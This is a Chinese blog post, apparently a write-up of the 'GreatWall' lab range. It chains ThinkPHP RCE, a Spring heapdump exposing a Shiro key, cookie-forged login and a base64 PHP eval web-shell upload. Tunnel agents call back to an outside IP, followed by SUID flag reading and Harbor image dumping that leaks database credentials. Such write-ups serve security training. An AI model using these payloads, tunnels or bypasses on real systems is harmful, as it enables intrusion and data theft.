<!doctype html><html lang=en><head><meta name=viewport content="width=device-width,initial-scale=1"><title>Wh1teJ0kerのBlog</title>
<meta charset=utf-8><meta name=description content="Ladder@春秋云境还是太贵了!!"><meta name=author content="Wh1teJ0ker"><link rel=canonical href=https://wh1tej0ker.github.io/post/greatwall-z1cku96.html><link rel=alternate type=application/rss+xml href=https://wh1tej0ker.github.io//index.xml title=Wh1teJ0kerのBlog><script async defer data-website-id=56cc42c1-3656-4d3e-af3c-acded927b8ed src=https://analytics.umami.is/script.js></script><meta property="og:url" content="https://wh1tej0ker.github.io/post/greatwall-z1cku96.html"><meta property="og:site_name" content="Wh1teJ0kerのBlog"><meta property="og:title" content="春秋云境-GreatWall"><meta property="og:description" content="春秋云境还是太贵了!!"><meta property="og:locale" content="zh_CN"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2025-03-05T14:23:57+08:00"><meta property="article:modified_time" content="2025-05-07T21:08:53+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="春秋云境-GreatWall"><meta name=twitter:description content="春秋云境还是太贵了!!"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://wh1tej0ker.github.io/post/"},{"@type":"ListItem","position":2,"name":"春秋云境-GreatWall","item":"https://wh1tej0ker.github.io/post/greatwall-z1cku96.html"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"春秋云境-GreatWall","name":"春秋云境-GreatWall","description":"春秋云境还是太贵了!!","keywords":[],"articleBody":"春秋云境-GreatWall 首先扫描端口，发现8080存活\n然后thinkphp一把梭\n​\n拿到了第一个shell\n然后上传到目录\n​​\n但是很快发现在这个目录下不能完全执行\n后来想起来原来是蚁剑的不是纯交互式终端\n重新fscan扫描一下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 ┌──────────────────────────────────────────────┐ │ ___ _ │ │ / _ \\ ___ ___ _ __ __ _ ___| | __ │ │ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / │ │ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c │ │ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │ └──────────────────────────────────────────────┘ Fscan Version: 2.0.0 [2025-03-08 20:54:25] [INFO] 暴力破解线程数: 1 [2025-03-08 20:54:25] [INFO] 开始信息扫描 [2025-03-08 20:54:25] [INFO] CIDR范围: 172.28.23.0-172.28.23.255 [2025-03-08 20:54:25] [INFO] 生成IP范围: 172.28.23.0.%!d(string=172.28.23.255) - %!s(MISSING).%!d(MISSING) [2025-03-08 20:54:25] [INFO] 解析CIDR 172.28.23.17/24 -\u003e IP范围 172.28.23.0-172.28.23.255 [2025-03-08 20:54:25] [INFO] 最终有效主机数量: 256 [2025-03-08 20:54:25] [INFO] 开始主机扫描 [2025-03-08 20:54:25] [INFO] 正在尝试无监听ICMP探测... [2025-03-08 20:54:26] [INFO] 当前用户权限不足,无法发送ICMP包 [2025-03-08 20:54:26] [INFO] 切换为PING方式探测... [2025-03-08 20:54:26] [SUCCESS] 目标 172.28.23.26 存活 (ICMP) [2025-03-08 20:54:26] [SUCCESS] 目标 172.28.23.33 存活 (ICMP) [2025-03-08 20:54:26] [SUCCESS] 目标 172.28.23.17 存活 (ICMP) [2025-03-08 20:54:32] [INFO] 存活主机数量: 3 [2025-03-08 20:54:32] [INFO] 有效端口数量: 233 [2025-03-08 20:54:32] [SUCCESS] 端口开放 172.28.23.17:80 [2025-03-08 20:54:32] [SUCCESS] 端口开放 172.28.23.33:22 [2025-03-08 20:54:32] [SUCCESS] 端口开放 172.28.23.26:22 [2025-03-08 20:54:32] [SUCCESS] 端口开放 172.28.23.26:21 [2025-03-08 20:54:32] [SUCCESS] 端口开放 172.28.23.17:22 [2025-03-08 20:54:32] [SUCCESS] 端口开放 172.28.23.26:80 [2025-03-08 20:54:32] [SUCCESS] 端口开放 172.28.23.33:8080 [2025-03-08 20:54:32] [SUCCESS] 端口开放 172.28.23.17:8080 [2025-03-08 20:54:32] [SUCCESS] 服务识别 172.28.23.33:22 =\u003e [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.10.] [2025-03-08 20:54:32] [SUCCESS] 服务识别 172.28.23.26:22 =\u003e [ssh] 版本:7.2p2 Ubuntu 4ubuntu2.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10.] [2025-03-08 20:54:32] [SUCCESS] 服务识别 172.28.23.26:21 =\u003e [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).] [2025-03-08 20:54:32] [SUCCESS] 服务识别 172.28.23.17:22 =\u003e [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.7 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.7.] [2025-03-08 20:54:37] [SUCCESS] 服务识别 172.28.23.17:8080 =\u003e [http] [2025-03-08 20:54:37] [SUCCESS] 服务识别 172.28.23.33:8080 =\u003e [http] [2025-03-08 20:54:38] [SUCCESS] 服务识别 172.28.23.17:80 =\u003e [http] [2025-03-08 20:54:38] [SUCCESS] 服务识别 172.28.23.26:80 =\u003e [http] [2025-03-08 20:54:38] [INFO] 存活端口数量: 8 [2025-03-08 20:54:38] [INFO] 开始漏洞扫描 [2025-03-08 20:54:38] [INFO] 加载的插件: ftp, ssh, webpoc, webtitle [2025-03-08 20:54:38] [SUCCESS] 网站标题 http://172.28.23.17 状态码:200 长度:10887 标题:\"\" [2025-03-08 20:54:38] [SUCCESS] 网站标题 http://172.28.23.17:8080 状态码:200 长度:1027 标题:Login Form [2025-03-08 20:54:38] [SUCCESS] 网站标题 http://172.28.23.26 状态码:200 长度:13693 标题:新翔OA管理系统-OA管理平台联系电话：13849422648微信同号，QQ958756413 [2025-03-08 20:54:38] [SUCCESS] 网站标题 http://172.28.23.33:8080 状态码:302 长度:0 标题:无标题 重定向地址: http://172.28.23.33:8080/login;jsessionid=C0147F5D5100AFE63969477D86B84D8F [2025-03-08 20:54:38] [SUCCESS] 匿名登录成功! [2025-03-08 20:54:39] [SUCCESS] 网站标题 http://172.28.23.33:8080/login;jsessionid=C0147F5D5100AFE63969477D86B84D8F 状态码:200 长度:3860 标题:智联科技 ERP 后台登陆 [2025-03-08 20:54:39] [SUCCESS] 目标: http://172.28.23.17:8080 漏洞类型: poc-yaml-thinkphp5023-method-rce 漏洞名称: poc1 详细信息: links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce [2025-03-08 20:54:40] [SUCCESS] 目标: http://172.28.23.33:8080 漏洞类型: poc-yaml-spring-actuator-heapdump-file 漏洞名称: 详细信息: author:AgeloVito links:https://www.cnblogs.com/wyb628/p/8567610.html [2025-03-08 20:54:40] [SUCCESS] 目标: http://172.28.23.33:8080 漏洞类型: poc-yaml-springboot-env-unauth 漏洞名称: spring2 详细信息: links:https://github.com/LandGrey/SpringBootVulExploit 然后将流量代理出来\n1 2 python neoreg.py -k shell -p 8888 -u http://8.130.71.207:8080/tunnel.php python3 neoreg.py -k shell -u http://39.101.64.150:8080/tunnel.php ​​\n1 python dirsearch.py -u http://172.28.23.33:8080 --proxy socks5://127.0.0.1:8888 ​​\n结合一下，很明显是heapdump\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 PS D:\\CTFtools\\Web\\dirsearch-0.4.3\\dirsearch-0.4.3\\dirsearch-0.4.3\u003e python dirsearch.py -u http://172.28.23.33:8080 --proxy socks5://127.0.0.1:8888 _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460 Output File: D:\\CTFtools\\Web\\dirsearch-0.4.3\\dirsearch-0.4.3\\dirsearch-0.4.3\\reports\\http_172.28.23.33_8080\\_25-03-08_21-30-38.txt Target: http://172.28.23.33:8080/ [21:30:38] Starting: [21:31:09] 404 - 96B - /;/login [21:31:10] 400 - 435B - /\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd [21:31:12] 400 - 435B - /a%5c.aspx [21:31:15] 404 - 111B - /actuator/;/auditevents [21:31:15] 200 - 2KB - /actuator [21:31:15] 404 - 108B - /actuator/;/auditLog [21:31:15] 404 - 105B - /actuator/;/beans [21:31:15] 404 - 106B - /actuator/;/caches [21:31:15] 404 - 110B - /actuator/;/conditions [21:31:15] 404 - 111B - /actuator/;/configprops [21:31:15] 404 - 121B - /actuator/;/configurationMetadata [21:31:15] 404 - 104B - /actuator/;/dump [21:31:15] 404 - 103B - /actuator/;/env [21:31:15] 404 - 124B - /actuator/;/exportRegisteredServices [21:31:15] 404 - 106B - /actuator/;/events [21:31:15] 404 - 108B - /actuator/;/features [21:31:15] 404 - 106B - /actuator/;/flyway [21:31:15] 404 - 111B - /actuator/;/healthcheck [21:31:15] 404 - 106B - /actuator/;/health [21:31:15] 404 - 108B - /actuator/;/heapdump [21:31:15] 404 - 107B - /actuator/;/jolokia [21:31:15] 404 - 104B - /actuator/;/info [21:31:15] 404 - 116B - /actuator/;/integrationgraph [21:31:15] 404 - 109B - /actuator/;/httptrace [21:31:15] 404 - 109B - /actuator/;/liquibase [21:31:15] 404 - 107B - /actuator/;/logfile [21:31:15] 404 - 107B - /actuator/;/metrics [21:31:15] 404 - 107B - /actuator/;/loggers [21:31:15] 404 - 108B - /actuator/;/mappings [21:31:15] 404 - 118B - /actuator/;/registeredServices [21:31:15] 404 - 110B - /actuator/;/prometheus [21:31:15] 404 - 107B - /actuator/;/refresh [21:31:15] 404 - 113B - /actuator/;/loggingConfig [21:31:15] 404 - 117B - /actuator/;/releaseAttributes [21:31:15] 404 - 117B - /actuator/;/resolveAttributes [21:31:15] 404 - 114B - /actuator/;/scheduledtasks [21:31:15] 404 - 108B - /actuator/;/sessions [21:31:15] 404 - 108B - /actuator/;/shutdown [21:31:15] 404 - 113B - /actuator/;/springWebflow [21:31:15] 404 - 103B - /actuator/;/sso [21:31:15] 404 - 111B - /actuator/;/ssoSessions [21:31:15] 404 - 110B - /actuator/;/statistics [21:31:15] 404 - 106B - /actuator/;/status [21:31:15] 404 - 110B - /actuator/;/threaddump [21:31:15] 404 - 105B - /actuator/;/trace [21:31:15] 404 - 106B - /actuator/auditLog [21:31:15] 404 - 109B - /actuator/auditevents [21:31:15] 200 - 20B - /actuator/caches [21:31:15] 200 - 91KB - /actuator/beans [21:31:15] 404 - 102B - /actuator/dump [21:31:15] 404 - 119B - /actuator/configurationMetadata [21:31:15] 200 - 7KB - /actuator/env [21:31:15] 200 - 99KB - /actuator/conditions [21:31:15] 404 - 122B - /actuator/exportRegisteredServices [21:31:15] 404 - 104B - /actuator/events [21:31:15] 404 - 104B - /actuator/flyway [21:31:15] 404 - 106B - /actuator/features [21:31:15] 404 - 112B - /actuator/gateway/routes [21:31:16] 404 - 109B - /actuator/healthcheck [21:31:16] 200 - 167B - /actuator/health [21:31:16] 404 - 107B - /actuator/liquibase [21:31:16] 404 - 105B - /actuator/logfile [21:31:16] 200 - 50KB - /actuator/loggers [21:31:16] 404 - 111B - /actuator/loggingConfig [21:31:16] 404 - 108B - /actuator/management [21:31:16] 200 - 22KB - /actuator/mappings [21:31:16] 200 - 1018B - /actuator/metrics [21:31:16] 404 - 116B - /actuator/registeredServices [21:31:16] 404 - 115B - /actuator/releaseAttributes [21:31:16] 404 - 106B - /actuator/sessions [21:31:16] 404 - 105B - /actuator/refresh [21:31:16] 404 - 111B - /actuator/springWebflow [21:31:16] 404 - 115B - /actuator/resolveAttributes [21:31:16] 404 - 106B - /actuator/shutdown [21:31:16] 404 - 108B - /actuator/prometheus [21:31:16] 200 - 54B - /actuator/scheduledtasks [21:31:16] 404 - 101B - /actuator/sso [21:31:16] 404 - 109B - /actuator/ssoSessions [21:31:16] 404 - 112B - /actuator/hystrix.stream [21:31:16] 404 - 107B - /actuator/httptrace [21:31:16] 200 - 2B - /actuator/info [21:31:16] 200 - 85KB - /actuator/threaddump [21:31:16] 404 - 114B - /actuator/integrationgraph [21:31:16] 404 - 105B - /actuator/jolokia [21:31:16] 404 - 108B - /actuator/statistics [21:31:16] 200 - 14KB - /actuator/configprops [21:31:16] 404 - 104B - /actuator/status [21:31:17] 404 - 103B - /actuator/trace [21:31:17] 200 - 27MB - /actuator/heapdump 解密一下heapdump，只保留了关键部分\n1 2 3 4 5 6 7 D:\\CTFtools\\工具包--天狐渗透V1.2\\gui_scan\\heapdump\u003ejava -jar JDumpSpider-1.1-SNAPSHOT-full.jar C:\\Users\\14301\\Desktop\\heapdump.heapdump =========================================== CookieRememberMeManager(ShiroKey) ------------- algMode = GCM, key = AZYyIgMYhG6/CzIJlvpR2g==, algName = AES =========================================== ​​\n找到了密钥和利用链，但是目前的用户是ops01\n注入哥斯拉内存马\n​​\n设置代理进行连接\n然后在/home/ops01下发现了文件\n​​\n由于不熟悉pwn，这一部分不做赘述，只说一个小点\n在exp前面加上这一段设置为你做的代理即可\n1 2 socks.set_default_proxy(socks.SOCKS5, \"127.0.0.1\", 1080) socket.socket = socks.socksocket 现在开始看新翔OA，依据之前的扫描结果21端口开放得到相关源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 root@joker:/home/Work# proxychains ftp 172.28.23.26 ProxyChains-3.1 (http://proxychains.sf.net) |S-chain|-\u003c\u003e-127.0.0.1:1080-\u003c\u003e\u003c\u003e-172.28.23.26:21-\u003c\u003e\u003c\u003e-OK Connected to 172.28.23.26. 220 (vsFTPd 3.0.3) Name (172.28.23.26:root): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e passive Passive mode on. ftp\u003e dir 227 Entering Passive Mode (172,28,23,26,21,118). |S-chain|-\u003c\u003e-127.0.0.1:1080-\u003c\u003e\u003c\u003e-172.28.23.26:5494-\u003c\u003e\u003c\u003e-OK 150 Here comes the directory listing. -rw-r--r-- 1 0 0 7536672 Mar 23 2024 OASystem.zip ftp\u003e get OASystem.zip local: OASystem.zip remote: OASystem.zip 227 Entering Passive Mode (172,28,23,26,179,32). |S-chain|-\u003c\u003e-127.0.0.1:1080-\u003c\u003e\u003c\u003e-172.28.23.26:45856-\u003c\u003e\u003c\u003e-OK 150 Opening BINARY mode data connection for OASystem.zip (7536672 bytes). 226 Transfer complete. 500 Unknown command. 7536672 bytes received in 147.92 secs (49.7565 kB/s) ftp\u003e exit 221 Goodbye. 然后得到源码，重点关注开头的引用文件\n​​\n发现逻辑相对简单\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u003c?php function islogin(){ if(isset($_COOKIE['id'])\u0026\u0026isset($_COOKIE['loginname'])\u0026\u0026isset($_COOKIE['jueseid'])\u0026\u0026isset($_COOKIE['danweiid'])\u0026\u0026isset($_COOKIE['quanxian'])){ if($_COOKIE['id']!=''\u0026\u0026$_COOKIE['loginname']!=''\u0026\u0026$_COOKIE['jueseid']!=''\u0026\u0026$_COOKIE['danweiid']!=''\u0026\u0026$_COOKIE['quanxian']!=''){ return true; } else { return false; } } else { return false; } } ?\u003e 直接添加cookie就行\n1 id=1;loginname=1;jueseid=1;danweiid=1;quanxian=1 ​​\n然后开始发现在uploadbase64.php下可以任意上传文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u003c?php /** * Description: PhpStorm. * Author: yoby * DateTime: 2018/12/4 18:01 * Email:logove@qq.com * Copyright Yoby版权所有 */ $img = $_POST['imgbase64']; if (preg_match('/^(data:\\s*image\\/(\\w+);base64,)/', $img, $result)) { $type = \".\".$result[2]; $path = \"upload/\" . date(\"Y-m-d\") . \"-\" . uniqid() . $type; } $img = base64_decode(str_replace($result[1], '', $img)); @file_put_contents($path, $img); exit('{\"src\":\"'.$path.'\"}'); 然后准备一下payload\n1 imgbase64=data:image/php;base64,PD9waHAgQGV2YWwoJF9QT1NUWydhdHRhY2snXSk7Pz4= 设置一下bp的socks代理\n​​\n再正常抓包即可\n​​\n上传成功开始连接\n​​\n很明显禁用了很多\n另外这里使用插件绕过\n​​\n但是发现post的无法执行，只能使用Get的\n1 /upload/.antproxy.php?pass=system(%22find%20/%20-perm%20-u=s%20-type%20f%202%3E/dev/null%22); ​​\n这里发现有suid提权\n使用base32\n1 /.antproxy.php?pass=system(\"base32 /flag02.txt\"); 分别开始在查看网卡，进行扫描\n​​\n在ERP的这台机子上发现还有一个网卡\n1 ./fscan -h 172.22.10.0/24 \u003e result 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 ┌──────────────────────────────────────────────┐ │ ___ _ │ │ / _ \\ ___ ___ _ __ __ _ ___| | __ │ │ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / │ │ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c │ │ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │ └──────────────────────────────────────────────┘ Fscan Version: 2.0.0 [2025-03-09 11:45:20] [INFO] 暴力破解线程数: 1 [2025-03-09 11:45:20] [INFO] 开始信息扫描 [2025-03-09 11:45:20] [INFO] CIDR范围: 172.22.10.0-172.22.10.255 [2025-03-09 11:45:20] [INFO] 生成IP范围: 172.22.10.0.%!d(string=172.22.10.255) - %!s(MISSING).%!d(MISSING) [2025-03-09 11:45:20] [INFO] 解析CIDR 172.22.10.0/24 -\u003e IP范围 172.22.10.0-172.22.10.255 [2025-03-09 11:45:20] [INFO] 最终有效主机数量: 256 [2025-03-09 11:45:20] [INFO] 开始主机扫描 [2025-03-09 11:45:20] [INFO] 正在尝试无监听ICMP探测... [2025-03-09 11:45:20] [INFO] 当前用户权限不足,无法发送ICMP包 [2025-03-09 11:45:20] [INFO] 切换为PING方式探测... [2025-03-09 11:45:21] [SUCCESS] 目标 172.22.10.16 存活 (ICMP) [2025-03-09 11:45:21] [SUCCESS] 目标 172.22.10.28 存活 (ICMP) [2025-03-09 11:45:26] [INFO] 存活主机数量: 2 [2025-03-09 11:45:27] [INFO] 有效端口数量: 233 [2025-03-09 11:45:27] [SUCCESS] 端口开放 172.22.10.28:80 [2025-03-09 11:45:27] [SUCCESS] 端口开放 172.22.10.28:22 [2025-03-09 11:45:27] [SUCCESS] 端口开放 172.22.10.16:22 [2025-03-09 11:45:27] [SUCCESS] 端口开放 172.22.10.28:3306 [2025-03-09 11:45:27] [SUCCESS] 端口开放 172.22.10.16:8080 [2025-03-09 11:45:27] [SUCCESS] 服务识别 172.22.10.28:22 =\u003e [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.10.] [2025-03-09 11:45:27] [SUCCESS] 服务识别 172.22.10.16:22 =\u003e [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.10.] [2025-03-09 11:45:27] [SUCCESS] 服务识别 172.22.10.28:3306 =\u003e [mysql] 版本:8.0.36-0ubuntu0.20.04.1 产品:MySQL Banner:[[.8.0.36-0ubuntu0.20.04.1.V;{xY ^.0 W]En: 8uB caching_sha2_password] [2025-03-09 11:45:32] [SUCCESS] 服务识别 172.22.10.28:80 =\u003e [http] 版本:1.25.4 产品:nginx [2025-03-09 11:45:32] [SUCCESS] 服务识别 172.22.10.16:8080 =\u003e [http] [2025-03-09 11:45:32] [INFO] 存活端口数量: 5 [2025-03-09 11:45:32] [INFO] 开始漏洞扫描 [2025-03-09 11:45:32] [INFO] 加载的插件: mysql, ssh, webpoc, webtitle [2025-03-09 11:45:32] [SUCCESS] 网站标题 http://172.22.10.28 状态码:200 长度:1975 标题:DooTask [2025-03-09 11:45:32] [SUCCESS] 网站标题 http://172.22.10.16:8080 状态码:302 长度:0 标题:无标题 重定向地址: http://172.22.10.16:8080/login;jsessionid=EFB0A9532795C590DF70C9E786D5D5E4 [2025-03-09 11:45:32] [SUCCESS] 网站标题 http://172.22.10.16:8080/login;jsessionid=EFB0A9532795C590DF70C9E786D5D5E4 状态码:200 长度:3860 标题:智联科技 ERP 后台登陆 [2025-03-09 11:45:33] [SUCCESS] 目标: http://172.22.10.16:8080 漏洞类型: poc-yaml-spring-actuator-heapdump-file 漏洞名称: 详细信息: author:AgeloVito links:https://www.cnblogs.com/wyb628/p/8567610.html [2025-03-09 11:45:34] [SUCCESS] 目标: http://172.22.10.16:8080 漏洞类型: poc-yaml-springboot-env-unauth 漏洞名称: spring2 详细信息: links:https://github.com/LandGrey/SpringBootVulExploit 接着开始搭建多层代理\n1 2 3 ./linux_x64_admin -l 1234 -s 1234 ./linux_x64_agent -c 62.234.111.84:1234 -s 1234 --reconnect 8 ./linux_x64_agent -c 172.28.23.17:8777 -s 1234 --reconnect 8 socks隧道启动\n1 2 3 4 (node 0) \u003e\u003e socks 1235 [*] Trying to listen on 0.0.0.0:1235...... [*] Waiting for agent's response...... [*] Socks start successfully! 目前拿到的这台是ERP，同样需要先进行扫描\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 / \u003eip a 1: lo: \u003cLOOPBACK,UP,LOWER_UP\u003e mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: eth0: \u003cBROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:16:3e:05:ba:7c brd ff:ff:ff:ff:ff:ff inet 172.28.23.33/16 brd 172.28.255.255 scope global dynamic eth0 valid_lft 1892156851sec preferred_lft 1892156851sec inet6 fe80::216:3eff:fe05:ba7c/64 scope link valid_lft forever preferred_lft forever 3: eth1: \u003cBROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:16:3e:05:ba:7e brd ff:ff:ff:ff:ff:ff inet 172.22.10.16/24 brd 172.22.10.255 scope global eth1 valid_lft forever preferred_lft forever inet6 fe80::216:3eff:fe05:ba7e/64 scope link valid_lft forever preferred_lft forever 并在http://172.22.14.46/​上发现了一台harbor\n使用404tk/CVE-2022-46463: harbor unauthorized detection下载镜像\n1 2 python3 harbor.py http://172.22.14.46/ python3 harbor.py http://172.22.14.46/ --dump harbor/secret --v2 ​​\n然后在另外一个镜像中找到了\n1 python3 harbor.py http://172.22.14.46/ --dump project/projectadmin --v2 反编译后得到\n1 2 3 4 5 6 7 spring.datasource.url=jdbc:mysql://172.22.10.28:3306/projectadmin?characterEncoding=utf-8\u0026useUnicode=true\u0026serverTimezone=UTC spring.datasource.username=root spring.datasource.password=My3q1i4oZkJm3 spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver mybatis.type-aliases-package=com.smartlink.projectadmin.entity mybatis.mapper-locations=classpath:mybatis/mapper/*.xml MDUT一把梭，但是extend版的怎么都连接不上\n​​\n最后一台机子是一个k8s，但是不知道为什么怎么都无法访问\n","wordCount":"3766","inLanguage":"en","datePublished":"2025-03-05T14:23:57+08:00","dateModified":"2025-05-07T21:08:53+08:00","author":{"@type":"Person","name":"Wh1teJ0ker"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://wh1tej0ker.github.io/post/greatwall-z1cku96.html"},"publisher":{"@type":"Organization","name":"Wh1teJ0kerのBlog","logo":{"@type":"ImageObject","url":"https://wh1tej0ker.github.io/favicon.ico"}}}</script><link rel=icon type=image/png href=/favicon.ico sizes=16x16><link rel=apple-touch-icon href=/favicon.ico><link rel=manifest href=/favicon.ico><link rel=stylesheet href=https://cdn.staticfile.org/lxgw-wenkai-webfont/1.6.0/style.css><link rel=stylesheet href=/css/main.min.9d998bab4720091d5ec1e0fbbffd92b254a2e791623df6106cd7ea760bfc5c28.css integrity="sha256-nZmLq0cgCR1eweD7v/2SslSi55FiPfYQbNfqdgv8XCg=" crossorigin=anonymous media=screen><link rel=stylesheet href=/scss/highlight/github-dark.min.min.66034289ee9a113219a2c4aae0a8bd2095ab255c832a42efcf5863f10814e7a1.css><script src=/js/highlight.min.min.c607d6febd16934a82eb61d3a896ed9d869f54373cc63ce95864ed5488fe3128.js></script><script>hljs.highlightAll()</script></head><body><main class=wrapper><nav class=navigation><section class=container><a class=navigation-brand href=/>HOME
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><span></span><span></span><span></span></label><ul class=navigation-list id=navigation-list><li class="navigation-item navigation-menu"><a class=navigation-link href=/categories/>分类</a></li><li class="navigation-item navigation-menu"><a class=navigation-link href=/archives/>归档</a></li><li class="navigation-item navigation-menu"><a class=navigation-link href=/friends/>友链</a></li><li class="navigation-item navigation-menu"><a class=navigation-link href=/about/>关于</a></li><li class="navigation-item navigation-menu"><a class=navigation-link href=https://cloud.umami.is/share/5RZUCwaG2fOysYPa/wh1tej0ker.github.io>Dashboard</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class="navigation-item navigation-social"><a class=navigation-link href=https://github.com/Wh1teJ0ker><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a></li></ul></section></nav><div id=content><article class=blog-single><header class=blog-title><h1>春秋云境-GreatWall</h1></header><p><small>March 5, 2025&nbsp;· &nbsp;·</small><p><div class=blog-toc><nav id=TableOfContents></nav></div><section class=blog-content><h1 id=春秋云境-greatwall>春秋云境-GreatWall</h1><p>首先扫描端口，发现8080存活</p><p>然后thinkphp一把梭</p><p>​<img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250308162502-zlxlegc.png alt=image></p><p>拿到了第一个shell</p><p>然后上传到目录</p><p>​<img src=https://raw.githubusercontent.com/Wh1teJ0ker/PicGo/main/Pic/image-20250308164037-2l1k4tr.png alt=image>​</p><p>但是很快发现在这个目录下不能完全执行</p><p>后来想起来原来是蚁剑的不是纯交互式终端</p><p>重新fscan扫描一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-dockerfile data-lang=dockerfile><span class=line><span class=cl>┌──────────────────────────────────────────────┐<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>│    ___                              _        │<span class=err>
